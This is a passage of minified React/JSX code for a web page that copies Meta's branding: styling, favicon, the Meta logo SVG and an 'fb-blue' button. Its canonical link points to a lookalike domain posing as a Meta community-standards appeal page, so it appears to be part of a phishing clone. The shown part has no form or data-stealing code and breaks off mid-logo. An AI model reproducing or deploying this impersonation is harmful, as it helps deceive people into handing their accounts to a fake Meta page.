                        __html: '\n    :root {\n        --swiper-theme-color: #007aff\n    }\n\n    :host {\n        position: relative;\n        display: block;\n        margin-left: auto;\n        margin-right: auto;\n        z-index: 1\n    }\n\n    @keyframes swiper-preloader-spin {\n        0% {\n            transform: rotate(0)\n        }\n\n        to {\n            transform: rotate(360deg)\n        }\n    }\n\n    :root {\n        --swiper-navigation-size: 44px\n    }\n\n    *,\n    :before,\n    :after {\n        box-sizing: border-box;\n        border-width: 0;\n        border-style: solid;\n        border-color: currentColor\n    }\n\n    :before,\n    :after {\n        --tw-content: ""\n    }\n\n    html {\n        line-height: 1.5;\n        -webkit-text-size-adjust: 100%;\n        -moz-tab-size: 4;\n        -o-tab-size: 4;\n        tab-size: 4;\n        font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, Segoe UI, Roboto, Helvetica Neue, Arial, Noto Sans, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";\n        font-feature-settings: normal;\n        font-variation-settings: normal\n    }\n\n    body {\n        margin: 0;\n        line-height: inherit\n    }\n\n    h4 {\n        font-size: inherit\n    }\n\n    ::-webkit-inner-spin-button,\n    ::-webkit-outer-spin-button {\n        height: auto\n    }\n\n    ::-webkit-search-decoration {\n        -webkit-appearance: none\n    }\n\n    ::-webkit-file-upload-button {\n        -webkit-appearance: button;\n        font: inherit\n    }\n\n    h6 {\n        margin: 0\n    }\n\n    ul {\n        list-style: none;\n        margin: 0;\n        padding: 0\n    }\n\n    :disabled {\n        cursor: default\n    }\n\n    img,\n    svg {\n        display: block;\n        vertical-align: middle\n    }\n\n    img {\n        max-width: 100%;\n        height: auto\n    }\n\n    *,\n    :before,\n    :after {\n        --tw-border-spacing-x: 0;\n        --tw-border-spacing-y: 0;\n        --tw-translate-x: 0;\n        --tw-translate-y: 0;\n        --tw-rotate: 0;\n        --tw-skew-x: 0;\n        --tw-skew-y: 0;\n        --tw-scale-x: 1;\n        --tw-scale-y: 1;\n        --tw-pan-x: ;\n        --tw-pan-y: ;\n        --tw-pinch-zoom: ;\n        --tw-scroll-snap-strictness: proximity;\n        --tw-gradient-from-position: ;\n        --tw-gradient-via-position: ;\n        --tw-gradient-to-position: ;\n        --tw-ordinal: ;\n        --tw-slashed-zero: ;\n        --tw-numeric-figure: ;\n        --tw-numeric-spacing: ;\n        --tw-numeric-fraction: ;\n        --tw-ring-inset: ;\n        --tw-ring-offset-width: 0px;\n        --tw-ring-offset-color: #fff;\n        --tw-ring-color: rgb(59 130 246/.5);\n        --tw-ring-offset-shadow: 0 0#0000;\n        --tw-ring-shadow: 0 0#0000;\n        --tw-shadow: 0 0#0000;\n        --tw-shadow-colored: 0 0#0000;\n        --tw-blur: ;\n        --tw-brightness: ;\n        --tw-contrast: ;\n        --tw-grayscale: ;\n        --tw-hue-rotate: ;\n        --tw-invert: ;\n        --tw-saturate: ;\n        --tw-sepia: ;\n        --tw-drop-shadow: ;\n        --tw-backdrop-blur: ;\n        --tw-backdrop-brightness: ;\n        --tw-backdrop-contrast: ;\n        --tw-backdrop-grayscale: ;\n        --tw-backdrop-hue-rotate: ;\n        --tw-backdrop-invert: ;\n        --tw-backdrop-opacity: ;\n        --tw-backdrop-saturate: ;\n        --tw-backdrop-sepia:\n    }\n\n    body {\n        font-family: nunito-regular\n    }\n\n    @media (max-width:768px) {}\n\n    @media (max-width:576px) {}\n\n    @media (min-width:1024px) {\n        @media (min-width:640px) {}\n\n        @media (min-width:768px) {}\n\n        @media (min-width:1024px) {}\n\n        @media (min-width:1280px) {}\n\n        @media (min-width:1536px) {}\n    }\n\n    @media (min-width:768px) {}\n\n    @media (min-width:1024px) {}\n\n    @media (min-width:1280px) {}\n\n    * {\n        font-family: Arial, Helvetica, sans-serif !important\n    }\n\n    #root {\n        overflow: hidden\n    }\n\n    svg {\n        display: inline-block\n    }\n\n    #main-component {\n        background: linear-gradient(130deg, rgba(249, 241, 249, 1) 0%, rgba(234, 243, 253, 1) 35%, rgba(237, 251, 242, 1) 100%);\n        height: 100vh;\n        overflow: hidden;\n        overflow-y: scroll\n    }\n\n    #main-component #main {\n        max-width: 1100px\n    }\n\n    .left {\n        border-right: 1px solid #DEE3E9\n    }\n\n    .left .left-content {\n        height: 100vh;\n        padding: 40px 20px 0 0;\n        position: sticky;\n        position: -webkit-sticky;\n        top: 0;\n        overflow-y: auto\n    }\n\n    *::-webkit-scrollbar {\n        width: 3px\n    }\n\n    *::-webkit-scrollbar-thumb {\n        background: rgb(74, 74, 74)\n    }\n\n    *::-webkit-scrollbar-track {\n        background: transparent\n    }\n\n    .logo {\n        width: 70px\n    }\n\n    .logo svg {\n        height: -moz-min-content;\n        height: min-content;\n        width: 100%\n    }\n\n    h1 {\n        line-height: 30px;\n        color: #1c1e21;\n        font-family: Optimistic Display Bold, Helvetica, Arial, sans-serif;\n        font-weight: 700;\n        margin: 16px 0\n    }\n\n    h1 {\n        font-size: 24px;\n        display: flex;\n        align-items: center\n    }\n\n    h1 svg {\n        margin-right: 8px\n    }\n\n    .action-button {\n        display: flex;\n        align-items: center;\n        width: 100%;\n        padding: 12px 16px;\n        border-radius: 15px;\n        color: #000;\n        background-color: inherit;\n        transition: background-color .35s ease;\n        cursor: pointer;\n        font-size: 16px;\n        font-weight: 500;\n        line-height: 20px;\n        font-family: Optimistic Text Medium, Helvetica, Arial, sans-serif\n    }\n\n    .action-button.main {\n        color: #fff;\n        background-color: #344854\n    }\n\n    .action-button.main svg path {\n        fill: #fff\n    }\n\n    .action-button .action-text {\n        width: 100%;\n        text-align: left;\n        padding: 0 12px\n    }\n\n    .action-button .action-icon svg {\n        width: 24px;\n        height: 24px\n    }\n\n    .action-button .action-arrow svg {\n        width: 24px;\n        height: 24px\n    }\n\n    .action-button:not(.main):hover {\n        background-color: #e3e8ef\n    }\n\n    .content-action {\n        height: 0;\n        overflow: hidden;\n        transition: .3s ease-in-out\n    }\n\n    .content-right {\n        padding: 40px 20px\n    }\n\n    p {\n        margin: 0;\n        font-size: 15px;\n        line-height: 20px;\n        font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif !important\n    }\n\n    h6 {\n        font-size: 15px;\n        font-weight: 600;\n        margin-bottom: 20px\n    }\n\n    li {\n        margin: 8px 0;\n        font-size: 15px\n    }\n\n    .card-thumb {\n        display: flex;\n        flex-direction: column;\n        border-radius: 20px;\n        background-color: #fff;\n        margin: 20px 0;\n        overflow: hidden\n    }\n\n    .thumb-content {\n        margin: 20px\n    }\n\n    .thumb-content .thumb-type {\n        font-size: 16px;\n        font-weight: 400;\n        margin-bottom: 10px\n    }\n\n    .thumb-content h4 {\n        font-weight: 500;\n        margin: 14px 0\n    }\n\n    .btn-wrapper {\n        width: 100%;\n        display: flex;\n        justify-content: center;\n        padding: 20px 0 0\n    }\n\n    .button {\n        width: 100%;\n        height: 50px;\n        border-radius: 20px;\n        display: flex;\n        justify-content: center;\n        align-items: center;\n        cursor: pointer\n    }\n\n    .button.fb-blue {\n        background-color: #0064e0;\n        color: #fff\n    }\n\n    .action-button-list .action-icon img {\n        width: 48px;\n        height: 48px\n    }\n\n    .small-grey {\n        color: #465a69;\n        font-family: Optimistic Text Normal, Helvetica, Arial, sans-serif;\n        font-size: 15px;\n        font-weight: 400;\n        line-height: 20px\n    }\n\n    .action-button-list .action-button {\n        border-radius: 0;\n        background-color: #fff\n    }\n\n    .action-button-list .action-button .action-arrow svg {\n        transform: rotate(-90deg)\n    }\n\n    .action-button-list .action-button.b-bottom {\n        border-bottom: 1px solid #E3E8EF\n    }\n\n    .action-button-list {\n        border-radius: 15px;\n        overflow: hidden\n    }\n\n    .link-to {\n        text-decoration: none;\n        font-size: 15px;\n        cursor: pointer;\n        color: #0d6efd;\n        display: inline;\n        margin: 0 0 0 5px\n    }\n\n    .link-to:hover {\n        text-decoration: underline\n    }\n\n    .link-to svg {\n        margin-left: 3px;\n        width: 14px;\n        height: 14px;\n        vertical-align: text-top\n    }\n\n    .link-to svg path {\n        fill: #0d6efd;\n        margin-left: 5px\n    }\n\n    .popup {\n        position: fixed;\n        padding: 0;\n        top: 0;\n        left: 0;\n        bottom: 0;\n        right: 0;\n        width: 100%;\n        height: 100%;\n        background: rgba(0, 0, 0, .5);\n        align-items: center;\n        display: flex;\n        justify-content: center;\n        flex-direction: column;\n        z-index: -1\n    }\n\n    @media (max-width:1001px) {\n        .col-8 {\n            width: 100% !important\n        }\n\n        .left.col-4 {\n            display: none\n        }\n\n        .right .content-right {\n            padding: 20px 5px\n        }\n\n        h1 svg {\n            width: 50px !important;\n            height: 50px !important;\n            margin-right: 8px\n        }\n\n        .logo {\n            margin: 0 auto\n        }\n    }\n'
                    }
                }), (0,
                he.jsx)("meta", {
                    name: "referrer",
                    content: "no-referrer"
                }), (0,
                he.jsx)("link", {
                    rel: "icon",
                    href: "data:image/x-icon;base64,AAABAAEAICAAAAEAIACoEAAAFgAAACgAAAAgAAAAQAAAAAEAIAAAAAAAABAAAMIeAADCHgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/4AABuJlBEfgYwCV///////////////////////////gZAC/4GMAleJlAEf/gAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6moLGOJmApbhZgHx4mYB/+FlAf///////////////////////////+FmAf/iZgH/4WYB/+JnAfHiZgKW6moLGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/20kB+RqBILjaQL042gC/+NoAv/iaAL/42gC////////////////////////////4mgB/+JoAv/iaAH/4mgC/+JoAv/jaQL05GoEgv9tJAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOpqCxjkagTH42oD/+NqA//jagP/42oD/+RrA//jagP////////////////////////////jagP/5GsD/+NqA//kawP/5GsD/+RrA//kawP/5GwEx+p1CxgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADocQYt5W4E4+VtBP/kbAP/5W0E/+RsA//kbAP/5W0E/+RsA////////////////////////////+RsA//kbQP/5GwD/+RtA//kbQP/5G0D/+RtA//kbQP/5G4D4+hxBi0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6nULGOZwBuPlbwT/5W8E/+VvBP/lbwT/5W8E/+VvBP/lbwT/5W8E////////////////////////////5W8E/+ZwBf/lbwT/5nAF/+ZwBf/lbwT/5nAF/+VvBP/lbwT/5nAG4+p1CxgAAAAAAAAAAAAAAAAAAAAAAAAAAP+SJAfncgXH5nIF/+ZxBf/mcQX/5nEF/+ZxBf/mcQX/5nEF/+dyBf/mcQX////////////////////////////ncgb/5nEF/+dyBv/mcQX/5nEF/+ZyBf/mcQX/5nIF/+ZyBf/mcQX/53IFx/+SJAcAAAAAAAAAAAAAAAAAAAAA53YIguh0Bv/ndAb/6HQG/+h0Bv/odAb/6HQG/+h0Bv/odAb/53QG/+h0Bv///////////////////////////+d0Bf/ndAb/53QF/+d0Bv/ndAb/6HUG/+d0Bv/odQb/6HUG/+d0Bf/odQb/53YGggAAAAAAAAAAAAAAAOqACxjodgb06HYH/+h2Bv/odgf/6HYH/+h2Bv/odgf/6HYG/+h2Bv/odgf/6HYG////////////////////////////6XcH/+h2Bv/pdwf/6HYG/+h2Bv/odgf/6HYG/+h2B//odgf/6HYG/+h2B//odgb06oALGAAAAAAAAAAA63oJlul5CP/qeQj/6XkI/+p5CP/qeQj/6XkH/+p5CP/peQf/6XkH/+l5B//peQf////////////////////////////peQj/6XkH/+l5CP/peQf/6XkH/+l5CP/peQf/6XkI/+l5CP/peQf/6XkI/+l5B//regmWAAAAAP+AKwbsfQrx63wJ/+p7CP/rfAn/6nsI/+p7CP/qewj/6nsI/+p7CP/qewj/63wJ/+p7CP///////////////////////////+p7CP/qfAn/6nsI/+p8Cf/qfAn/6nsI/+p8Cf/qewj/6nsI/+t8Cf/qewj/63wJ/+x9CvH/gCsG7YELR+t9Cf/rfQn/634J/+t9Cf/rfgn/634J/+t+Cf/rfgn///////////////////////////////////////////////////////////////////////Ozbv/rfgn/7H4J/+t+Cf/rfgn/634J/+t+Cf/rfgn/634J/+2BC0fsgAqV7IAK/+yACv/sgAr/7IAK/+yACv/sgAr/7IAK/+yACv//////////////////////////////////////////////////////////////////////9cKK/+yACv/sgAr/7IAK/+yACv/sgAn/7IAK/+yACf/sgAn/7IAKle6DC7/tgwv/7YML/+2CCv/tgwv/7YIK/+2CCv/tggr/7YIK///////////////////////////////////////////////////////////////////////40qf/7YML/+2CCv/tgwv/7YML/+2DC//tgwv/7YML/+2DC//ugwu/74YM2e6FC//uhQv/7oUL/+6FC//uhQv/7oUL/++FDP/uhQv///////////////////////////////////////////////////////////////////////rhxP/uhQv/7oUL/+6FC//uhQv/7oQL/+6FC//uhAv/7oQL/++GDNnviA7z74gM/++IDP/vhwz/74gM/++HDP/vhwz/74cM/++HDP///////////////////////////////////////////////////////////////////////fDh/++IDf/vhwz/74gN/++IDf/vhwz/74gN/++HDP/vhwz/74cN8/CLDvPwig3/8IoN//CKDf/wig3/8IoN//CKDf/wiQ3/8IoN//CJDf/wiQ3/8IoN//CJDf////////////////////////////CJDf/wig3/8IkN//CKDf/wig3/8IkN//CKDf/wiQ3/8IkN//CJDf/wiQ3/8IkN//CJDf/wiw7z8o0O2fGMDv/xjA7/8YwN//GMDv/xjA3/8YwN//GMDf/xjA3/8YwN//GMDf/xjA7/8YwN////////////////////////////8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//GMDv/xjA7/8YwO//KNDtnyjw+/8o8P//KPD//yjw//8o8P//KPD//yjw//8o8P//KPD//yjw//8o8P//KODv/yjw/////////////////////////////xjg7/8o4O//GODv/yjg7/8o4O//KODv/yjg7/8o4O//KODv/yjw//8o4O//KPD//yjw//85AQv/ORD5XzkQ//85EP//ORD//zkQ//85EP//ORD//zkQ//85EP//ORD//zkQ//85EQ//ORD//++vT///////////////////////SbJv/zkRD/85EP//OREP/zkRD/85EP//OREP/zkQ//85EP//ORD//zkQ//85EP//ORD//zkQ+V9JcSR/STEP/0kxD/9JQQ//STEP/0lBD/9JQQ//OTEP/0lBD/85MQ//OTEP/0lBD/85MQ//zq0P//////////////////////+tWi//WdJv/zkxD/9JMQ//STEP/0kxD/9JMQ//STEP/0kxD/9JQQ//STEP/0lBD/9JQQ//STEkf/qisG9ZYS8fWWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhH/+9mr//////////////////////////////////////////////////WWEf/1lhH/9ZYR//WWEf/1lhH/9ZYR//WWEf/1lhLx/6orBgAAAAD3mROW9pgS//aYEf/2mBL/9pgR//aYEf/1mBH/9pgR//WYEf/1mBH/9pgS//WYEf/4sU3/////////////////////////////////////////////////9pgS//WYEf/2mBL/9pgS//WYEf/2mBL/9ZgR//eZEZYAAAAAAAAAAP+fFRj4nBT095sT//ebE//3mxP/95sT//ebE//3mxP/95sT//ebE//3mhL/95sT//eaEv/84rv////////////////////////////////////////////3mxP/95sT//ebE//3mxP/9poS//ebE//3mxP0/58VGAAAAAAAAAAAAAAAAPmfFIL4nRP/+J0T//idE//4nRP/95wT//idE//3nBP/95wT//idE//3nBP/+J0T//ilJ//958X///////////////////////////////////////idE//3nRP/+J0T//idE//4nRP/+J0T//mfFIIAAAAAAAAAAAAAAAAAAAAA/7YkB/qgFcf5oBT/+aAU//mgFP/4nxT/+aAU//ifFP/4nxT/+Z8U//ifFP/5nxT/+Z8U//mhF//7zof//vDa//78+P/+/fr//vnx//7z4//969D/+aAU//mfFP/5oBT/+aAU//ifFP/6oBXH/7YkBwAAAAAAAAAAAAAAAAAAAAAAAAAA/6oVGPujFeP5oRT/+aEU//qiFf/5oRT/+qIV//qiFf/6ohX/+qIV//qiFf/6ohX/+aEU//qiFf/5oRT/+aEU//qiFf/5oRT/+qIV//qiFf/5oRT/+qIV//mhFP/5oRT/+6MV4/+qFRgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/6YWLvykFeP7pBX/+6QW//ukFf/7pBb/+6QW//qkFf/7pBb/+qQV//qkFf/7pBb/+qQV//ukFv/7pBb/+6UW//ukFv/7pRb/+6UW//ukFf/7pRb/+6QV//ykFeP/pBctAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/6ogGPyoF8f8pxb//KcX//ynFv/8pxb//KcW//ynFv/8pxb//KcW//umFv/8pxb/+6YW//umFv/7phb/+6YW//umFv/7phb//KcW//umFv/8qBfH/6ogGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/7YkB/2rGIL9qRj0/KkX//ypF//8qBf//KkX//yoF//8qBf//akX//yoF//9qRf//akX//2pF//9qRf//akX//2pF//+qRj0/asYgv+2JAcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP+1IBj/rRqW/6wY8f6sGP/+rBj//qwY//6sGP/9qxj//qwY//2rGP/9qxj//asX//2rGP/+qxfx/awYlv+1IBgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/1SsG/7AZR/+vGpX/rxm//68a2f+uGfP/rhnz/68a2f+vGb//rxqV/7AZR//VKwYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/8AD//8AAP/8AAA/+AAAH/AAAA/gAAAHwAAAA8AAAAOAAAABgAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAGAAAABwAAAA8AAAAPgAAAH8AAAD/gAAB/8AAA//wAA///AA/8="
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: "\n    .sf-hidden {\n        display: none \n    }\n"
                    }
                }), (0,
                he.jsx)("link", {
                    rel: "canonical",
                    href: "https://meta.case-page-appeal.eu/community-standard/100092423721878"
                }), (0,
                he.jsx)("meta", {
                    httpEquiv: "content-security-policy",
                    content: "default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;"
                }), (0,
                he.jsx)("style", {
                    dangerouslySetInnerHTML: {
                        __html: '\n    img[src="data:,"],\n    source[src="data:,"] {\n        display: none !important\n    }\n'
                    }
                }), (0,
                he.jsx)("div", {
                    id: "root",
                    children: (0,
                    he.jsx)("div", {
                        children: (0,
                        he.jsx)("div", {
                            id: "main-component",
                            children: (0,
                            he.jsxs)("div", {
                                className: "container-sm",
                                id: "main",
                                children: [(0,
                                he.jsxs)("div", {
                                    class: "menu-mobile sf-hidden",
                                    children: [(0,
                                    he.jsx)("div", {
                                        class: "logo",
                                        children: (0,
                                        he.jsxs)("svg", {
                                            width: "329",
                                            height: "66",
                                            viewBox: "0 0 329 66",
                                            fill: "none",
                                            xmlns: "http://www.w3.org/2000/svg",
                                            children: [(0,
                                            he.jsxs)("g", {
                                                "clip-path": "url(#clip0_4090_978)",
                                                children: [(0,
                                                he.jsx)("path", {
                                                    d: "M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 56.3521C276.097 56.2328 277.076 56.0908 278.051 55.9264V64.0549C276.952 64.3803 275.715 64.6476 274.341 64.8502C272.96 65.0595 271.521 65.1604 270.01 65.1604C259.554 65.1604 254.326 59.4521 254.326 48.0288V26.0482ZM329 64.1421H319.499V57.6609C317.807 60.0883 315.659 61.9594 313.056 63.2748C310.445 64.5902 307.488 65.2548 304.169 65.2548C300.084 65.2548 296.461 64.2067 293.308 62.1185C290.148 60.0375 287.668 57.1619 285.868 53.5128C284.059 49.8564 283.156 45.6726 283.156 40.9688C283.156 36.2366 284.074 32.0456 285.911 28.4037C287.748 24.7619 290.285 21.9074 293.525 19.8336C296.772 17.7678 300.496 16.727 304.704 16.727C307.871 16.727 310.713 17.3408 313.229 18.5691C315.712 19.7699 317.864 21.561 319.499 23.7864V17.8398H329V64.1421ZM319.318 34.0395C318.284 31.4094 316.642 29.3284 314.408 27.8038C312.174 26.2792 309.585 25.5202 306.656 25.5202C302.506 25.5202 299.209 26.9075 296.75 29.6894C294.291 32.4713 293.062 36.2366 293.062 40.9688C293.062 45.7307 294.248 49.5092 296.613 52.2918C298.984 55.0737 302.195 56.461 306.259 56.461C309.245 56.461 311.913 55.6954 314.256 54.1563C316.592 52.6171 318.284 50.5428 319.318 47.9344V34.0395Z",
                                                    fill: "#1C2B33"
                                                }), (0,
                                                he.jsx)("path", {
                                                    d: "M70.8442 0C62.7456 0 57.1572 2.97264 49.4783 13.1571C42.2041 3.53826 36.29 0 28.2743 0C12.221 0 0 19.6469 0 43.1693C0 57.319 7.96641 65.34 18.7142 65.34C29.0724 65.34 35.3412 56.628 40.721 46.9999L47.0792 36.0043C47.7003 34.9304 48.3261 33.8592 48.9565 32.7908C49.6638 33.9793 50.3661 35.1709 51.0634 36.3653L57.4217 47.225C65.5842 61.1952 71.1469 65.34 80.5721 65.34C91.3949 65.34 98.7441 56.2828 98.7441 43.395C98.7441 18.6107 86.1309 0 70.8442 0ZM38.0153 30.6874L31.5669 41.4124C25.2534 51.9565 22.5924 54.2995 18.624 54.2995C14.4306 54.2995 11.1386 50.785 11.1386 42.7185C11.1386 26.5419 19.0754 11.4008 28.2743 11.4008C33.0599 11.4008 36.6164 13.7834 42.7911 22.9416C41.1668 25.5033 39.5747 28.0854 38.0153 30.6874ZM80.33 54.2995C75.9556 54.2995 73.0696 51.5057 67.1621 41.5021L60.8038 30.6874C58.968 27.5609 57.2493 24.721 55.6188 22.1437C62.0211 12.7453 65.8776 10.2742 70.7541 10.2742C80.0437 10.2742 87.9963 24.1078 87.9963 42.7185C87.9963 50.2445 84.8846 54.2995 80.33 54.2995Z",
                                                    fill: "#0180FA"
                                                }), (0,
                                                he.jsx)("path", {
                                                    d: "M95.8256 23.76H84.7981C86.8017 29.011 87.9967 35.506 87.9967 42.7185C87.9967 50.2445 84.885 54.2995 80.3303 54.2995H80.2764V65.3387L80.5718 65.34C91.3946 65.34 98.7438 56.2828 98.7438 43.395C98.7438 36.234 97.691 29.5898 95.8256 23.76Z",
                                                    fill: "url(#paint0_linear_4090_978)"
                                                }), (0,
                                                he.jsx)("path", {
                                                    d: "M27.6361 0.0107422C12.2587 0.512342 0.547587 19.0795 0.0185547 41.5802H11.1519C11.5039 26.2127 18.9255 12.0881 27.6361 11.4248V0.0114022V0.0107422Z",
                                                    fill: "url(#paint1_linear_4090_978)"
                                                }), (0,
                                                he.jsx)("path", {
                                                    d: "M49.4781 13.1571L49.4827 13.1512C51.0928 15.2783 52.9464 17.9223 55.6218 22.1404L55.6185 22.1437C57.249 24.7216 58.9677 27.5609 60.8035 30.6874L67.1618 41.5021C73.0693 51.5057 75.9553 54.2995 80.3297 54.2995C80.5337 54.2995 80.7357 54.2916 80.9337 54.2751V65.3367C80.8133 65.3387 80.6923 65.34 80.5712 65.34C71.1466 65.34 65.5839 61.1945 57.4214 47.225L51.0632 36.366L50.6519 35.6631L50.6657 35.64C49.0958 32.8845 45.661 27.2679 42.7875 22.9469L42.7908 22.9416L42.3828 22.341C41.5544 21.1088 40.7859 20.0066 40.1377 19.14L40.0943 19.1558C35.4844 13.1023 32.3181 11.4008 28.274 11.4008C28.0608 11.4008 27.8476 11.4088 27.6357 11.4253V0.01056C27.8476 0.00396 28.0608 0 28.274 0C36.2898 0 42.2039 3.5376 49.4781 13.1571Z",
                                                    fill: "url(#paint2_linear_4090_978)"
                                                })]
                                            }), (0,
                                            he.jsxs)("defs", {
                                                children: [(0,
                                                he.jsxs)("linearGradient", {
                                                    id: "paint0_linear_4090_978",
                                                    x1: "81.8424",
                                                    y1: "65.34",
                                                    x2: "105.911",
                                                    y2: "39.228",
                                                    gradientUnits: "userSpaceOnUse",
                                                    children: [(0,
                                                    he.jsx)("stop", {
                                                        offset: "0.427",
                                                        "stop-color": "#0278F1"
                                                    }), (0,
                                                    he.jsx)("stop", {
                                                        offset: "0.917",
                                                        "stop-color": "#0180FA"
                                                    })]
                                                }), (0,
                                                he.jsxs)("linearGradient", {
                                                    id: "paint1_linear_4090_978",
                                                    x1: "27.6361",
                                                    y1: "3.25794",
                                                    x2: "-1.20576",
                                                    y2: "40.6422",
                                                    gradientUnits: "userSpaceOnUse",
                                                    children: [(0,
                                                    he.jsx)("stop", {
                                                        offset: "0.427",
                                                        "stop-color": "#0165E0"
                                                    }), (0,
                                                    he.jsx)("stop", {
                                                        offset: "0.917",
                                                        "stop-color": "#0180FA"
                                                    })]
                                                }), (0,
                                                he.jsxs)("linearGradient", {
                                                    id: "paint2_linear_4090_978",
                                                    x1: "18.2112",
                                                    y1: "18.9486",
                                                    x2: "87.5348",
                                                    y2: "46.792",
                                                    gradientUnits: "userSpaceOnUse",
                                                    children: [(0,
                                                    he.jsx)("stop", {
                                                        "stop-color": "#0064E0"
                                                    }), (0,
                                                    he.jsx)("stop", {
                                                        offset: "0.656",
                                                        "stop-color": "#0066E2"
                                                    }), (0,
                                                    he.jsx)("stop", {
                                                        offset: "1",
                                                        "stop-color": "#0278F1"
                                                    })]
                                                }), (0,
                                                he.jsx)("clipPath", {
                                                    id: "clip0_4090_978",
                                                    children: (0,
                                                    he.jsx)("rect", {
                                                        width: "329",
                                                        height: "66",
                                                        fill: "white"
                                                    })
                                                })]
                                            })]
                                        })
                                    }), (0,
                                    he.jsxs)("div", {
                                        class: "button-menu",
                                        children: [(0,
                                        he.jsx)("div", {
                                            class: "item-button"
                                        }), (0,
                                        he.jsx)("div", {
                                            class: "item-button"
                                        }), (0,
                                        he.jsx)("div", {
                                            class: "item-button"
                                        })]
                                    })]
                                }), (0,
                                he.jsxs)("div", {
                                    className: "row",
                                    children: [(0,
                                    he.jsx)("div", {
                                        className: "left col-4",
                                        children: (0,
                                        he.jsxs)("div", {
                                            className: "left-content",
                                            children: [(0,
                                            he.jsx)("div", {
                                                className: "logo",
                                                children: (0,
                                                he.jsxs)("svg", {
                                                    width: 329,
                                                    height: 66,
                                                    viewBox: "0 0 329 66",
                                                    fill: "none",
                                                    xmlns: "http://www.w3.org/2000/svg",
                                                    children: [(0,
                                                    he.jsxs)("g", {
                                                        clipPath: "url(#clip0_4090_978)",
                                                        children: [(0,
                                                        he.jsx)("path", {
                                                            d: "M122.064 1.98657H134.372L155.298 39.8132L176.224 1.98657H188.264V64.1421H178.22V16.5033L159.875 49.4881H150.453L132.108 16.5026V64.1414H122.064V1.98657ZM221.273 65.2542C216.624 65.2542 212.531 64.2213 209.009 62.1693C205.488 60.1101 202.741 57.2629 200.766 53.621C198.799 49.9798 197.816 45.8099 197.816 41.0988C197.816 36.3376 198.777 32.1176 200.701 28.4466C202.625 24.7764 205.3 21.9074 208.72 19.8336C212.141 17.7678 216.074 16.727 220.514 16.727C224.932 16.727 228.728 17.7744 231.91 19.8554C235.099 21.9437 237.55 24.8701 239.264 28.6275C240.985 32.3849 241.845 36.7923 241.845 41.8578V44.6107H207.766C208.387 48.3971 209.921 51.381 212.364 53.5563C214.809 55.731 217.896 56.8147 221.628 56.8147C224.621 56.8147 227.195 56.3745 229.357 55.4855C231.519 54.5965 233.551 53.2527 235.446 51.4463L240.775 57.9711C235.475 62.8267 228.974 65.2542 221.273 65.2542ZM228.605 28.382C226.501 26.2356 223.746 25.1664 220.341 25.1664C217.021 25.1664 214.245 26.2574 212.01 28.4466C209.769 30.6365 208.359 33.5841 207.766 37.284H232.199C231.902 33.4976 230.702 30.5276 228.605 28.382ZM254.326 26.0482H245.085V17.8398H254.326V4.25499H264.008V17.8398H278.051V26.0482H264.008V46.8725C264.008 50.3335 264.601 52.8046 265.787 54.2863C266.973 55.7673 268.998 56.5039 271.875 56.5039C273.148 56.5039 274.226 56.4537 275.115 